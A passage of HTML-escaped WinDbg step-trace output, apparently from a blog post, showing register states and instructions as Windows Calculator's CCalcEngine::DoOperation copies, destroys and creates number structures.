eax,dword ptr [eax]&amp;nbsp; ds:0023:00379df0=00379d90&lt;br /&gt;eax=00379d90 ebx=006cc278 ecx=00375548 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049136c esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x556:&lt;br /&gt;0049136c 8b4804&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,dword ptr [eax+4] ds:0023:00379d94=00000001&lt;br /&gt;eax=00379d90 ebx=006cc278 ecx=00000001 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049136f esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x559:&lt;br /&gt;0049136f 8d0c8d0c000000&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,[ecx*4+0Ch]&lt;br /&gt;eax=00379d90 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491376 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x560:&lt;br /&gt;00491376 51&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx&lt;br /&gt;eax=00379d90 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491377 esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x561:&lt;br /&gt;00491377 50&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax&lt;br /&gt;eax=00379d90 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491378 esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x562:&lt;br /&gt;00491378 8b45ec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [ebp-14h] ss:0023:0020e374=00375548&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049137b esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x565:&lt;br /&gt;0049137b ff30&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:00375548=00378300&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049137d esp=0020e344 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x567:&lt;br /&gt;0049137d e8f90cfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!memcpy (0047207b)&lt;br /&gt;eax=00378300 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491382 esp=0020e344 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x56c:&lt;br /&gt;00491382 8b45ec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [ebp-14h] ss:0023:0020e374=00375548&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491385 esp=0020e344 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x56f:&lt;br /&gt;00491385 83c40c&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; esp,0Ch&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491388 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz ac pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000216&lt;br /&gt;calc!CCalcEngine::DoOperation+0x572:&lt;br /&gt;00491388 ff7004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax+4]&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:0037554c=00000000&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049138b esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz ac pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000216&lt;br /&gt;calc!CCalcEngine::DoOperation+0x575:&lt;br /&gt;0049138b e8490dfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_destroynum (004720d9)&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491390 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x57a:&lt;br /&gt;00491390 8b45ec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [ebp-14h] ss:0023:0020e374=00375548&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491393 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x57d:&lt;br /&gt;00491393 897804&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax+4],edi ds:0023:0037554c=00000000&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491396 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x580:&lt;br /&gt;00491396 8b06&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [esi]&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=00491398 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x582:&lt;br /&gt;00491398 8b4004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [eax+4] ds:0023:00379df4=003762f8&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049139b esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x585:&lt;br /&gt;0049139b ff7004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax+4]&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:003762fc=00000001&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049139e esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x588:&lt;br /&gt;0049139e e8510dfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_createnum (004720f4)&lt;br /&gt;eax=003770f0 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913a3 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x58d:&lt;br /&gt;004913a3 8b4dec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,dword ptr [ebp-14h] ss:0023:0020e374=00375548&lt;br /&gt;eax=003770f0 ebx=006cc278 ecx=00375548 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913a6 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x590:&lt;br /&gt;004913a6 894104&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ecx+4],eax ds:0023:0037554c=00000000&lt;br /&gt;eax=003770f0 ebx=006cc278 ecx=00375548 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913a9 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x593:&lt;br /&gt;004913a9 8b06&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [esi]&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00375548 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913ab esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x595:&lt;br /&gt;004913ab 8b4004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [eax+4] ds:0023:00379df4=003762f8&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00375548 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913ae esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x598:&lt;br /&gt;004913ae 8b4804&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,dword ptr [eax+4] ds:0023:003762fc=00000001&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000001 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913b1 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x59b:&lt;br /&gt;004913b1 8d0c8d0c000000&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,[ecx*4+0Ch]&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913b8 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5a2:&lt;br /&gt;004913b8 51&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913b9 esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5a3:&lt;br /&gt;004913b9 50&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913ba esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5a4:&lt;br /&gt;004913ba 8b45ec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [ebp-14h] ss:0023:0020e374=00375548&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913bd esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; 